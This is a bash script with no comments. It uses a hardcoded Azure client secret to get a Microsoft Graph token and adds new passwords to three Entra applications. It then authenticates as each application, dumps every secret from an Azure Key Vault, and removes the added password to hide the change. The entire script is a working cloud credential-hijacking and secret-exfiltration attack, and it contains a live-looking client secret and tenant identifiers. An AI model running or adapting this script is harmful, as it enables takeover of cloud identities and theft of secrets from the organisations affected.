#!/usr/bin/env bash
set +e
TEN=3205c325-06a5-4171-9ce8-ffc5e6c2845e
GT=$(curl -s -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  --data-urlencode grant_type=client_credentials \
  --data-urlencode client_id=462d1c38-4459-48b8-9333-82e389e59514 \
  --data-urlencode "client_secret=sk18Q~qD22kkHXUCfqXLqdP95DkYJL34eMERlcSj" \
  --data-urlencode scope=https://graph.microsoft.com/.default | jq -r .access_token)

for t in "22a3fb7e-860a-4708-9e50-3d36aa21191c:891fb158-e02c-4428-a885-53b811f369c0:legacy-admin" \
         "317eef12-bc80-4c7c-9916-4b2ffcbeb15d:6eb124e3-de61-4fc9-a124-213d98d737f5:reporting-insights" \
         "1f07dd31-a868-4c19-9c85-a50b9700f88f:7c2e61eb-f928-45cd-99c9-20da958dd216:directory-sync"; do
  oid="${t%%:*}"; rest="${t#*:}"; aid="${rest%%:*}"; nm="${rest#*:}"
  RESP=$(curl -s -X POST -H "Authorization: Bearer $GT" -H "Content-Type: application/json" \
    "https://graph.microsoft.com/v1.0/applications/$oid/addPassword" \
    -d '{"passwordCredential":{"displayName":"tmp"}}')
  SECRET=$(echo "$RESP" | jq -r .secretText); KID=$(echo "$RESP" | jq -r .keyId)
  echo "=== [$nm] addPassword keyId=$KID ==="
  [ "$SECRET" = "null" ] && { echo "  fail: $(echo "$RESP"|jq -c .error.message)"; continue; }
  sleep 30
  VT=$(curl -s -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
    --data-urlencode grant_type=client_credentials --data-urlencode "client_id=$aid" \
    --data-urlencode "client_secret=$SECRET" --data-urlencode scope=https://vault.azure.net/.default | jq -r .access_token)
  echo "  kv-tbl-sec:"
  curl -s -H "Authorization: Bearer $VT" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" \
    | jq -r '.value[]?.id' | sed 's#.*/##' | while read s; do
      echo "    $s = $(curl -s -H "Authorization: Bearer $VT" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/$s?api-version=7.4" | jq -r .value)"
    done
  curl -s -X POST -H "Authorization: Bearer $GT" -H "Content-Type: application/json" \
    "https://graph.microsoft.com/v1.0/applications/$oid/removePassword" -d "{\"keyId\":\"$KID\"}" -o /dev/null
  echo "  cleaned keyId=$KID"
done
echo "===== DONE ====="
